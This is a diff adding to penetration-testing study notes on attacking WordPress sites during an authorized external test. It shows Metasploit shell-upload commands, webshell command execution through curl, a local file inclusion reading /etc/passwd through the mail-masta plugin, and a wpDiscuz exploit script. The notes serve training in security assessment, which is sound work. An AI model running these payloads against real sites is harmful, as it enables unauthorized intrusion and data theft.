@@ -37,6 +37,12 @@ External Penetration Test - <Client Name>
   o <Hostname or IP>
 ```
 
+At the very least, our report should have an appendix section that lists the following information—more on this in a later module:
+- Exploited systems (hostname/IP and method of exploitation)
+- Compromised users (account name, method of compromise, account type (local or domain))
+- Artifacts created on systems
+- Changes (such as adding a local admin user or modifying group membership)
+
 ## Initial Enumeration
 
 1. We can start with an Nmap scan of common web ports. I'll typically do an initial scan with ports 80,443,8000,8080,8180,8888,10000 and then run either EyeWitness or Aquatone (or both depending on the results of the first) against this initial scan.
@@ -134,7 +140,7 @@ The default WordPress login page can be found at /wp-login.php.
 ```
 sudo gem install wpscan
 ```
-WPScan is also able to pull in vulnerability information from external sources. We can obtain an API token from WPVulnDB, which is used by WPScan to scan for PoC and reports. The free plan allows up to 75 requests per day. To use the WPVulnDB database, just create an account and copy the API token from the users page. This token can then be supplied to wpscan using the `--api-token parameter`.
+WPScan is also able to pull in vulnerability information from external sources. We can obtain an API token from [WPVulnDB](https://wpscan.com/), which is used by WPScan to scan for PoC and reports. The free plan allows up to 75 requests per day. To use the WPVulnDB database, just create an account and copy the API token from the users page. This token can then be supplied to wpscan using the `--api-token parameter`.
 ```
 wpscan -h
 ```
@@ -153,7 +159,11 @@ If we gained admin credentials, we can try to edit a theme on the admin panel (A
 ```
 curl http://blog.company.local/wp-content/themes/twentynineteen/404.php?0=id
 ```
+#### Metasploit
 The `wp_admin_shell_upload` module from Metasploit can be used to upload a shell and execute it automatically:
+```
+msfconsole
+```
 ```
 use exploit/unix/webapp/wp_admin_shell_upload
 ```
@@ -161,9 +171,32 @@ To ensure that everything is set up properly:
 ```
 show options
 ```
+To set a value:
+```
+set RHOST <IP>
+```
 Once the setup is correct:
 ```
 exploit
 ```
+In this example, the Metasploit module uploaded the `wCoUuUPfIO.php` file to the `/wp-content/plugins directory`. Many Metasploit modules (and other tools) attempt to clean up after themselves, but some fail. During an assessment, we would want to make every attempt to clean up this artifact from the client system and, regardless of whether we were able to remove it or not, we should list this artifact in our report appendices. 
 
+### Leveraging Known Vulnerabilities
+The vast majority of the vulnerabilities can be found in plugins.
+*Note: We can use the waybackurls tool to look for older versions of a target site using the Wayback Machine. Sometimes we may find a previous version of a WordPress site using a plugin that has a known vulnerability. If the plugin is no longer in use but the developers did not remove it properly, we may still be able to access the directory it is stored in and exploit a flaw.*
+
+#### mail-pasta plugin
+LFI:
+```
+curl -s http://blog.company.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
+```
+#### wpDiscuz plugin
+Using [this exploit](https://www.exploit-db.com/exploits/49967):
+```
+python3 wp_discuz.py -u http://blog.company.local -p /?p=1
+```
+The exploit as written may fail, but we can use cURL to execute commands using the uploaded web shell. We just need to append ?cmd= after the .php extension to run commands which we can see in the exploit script:
+```
+curl -s http://blog.company.local/wp-content/uploads/2021/08/uthsdkbywoxeebg-1629904090.8191.php?cmd=id
+```
 
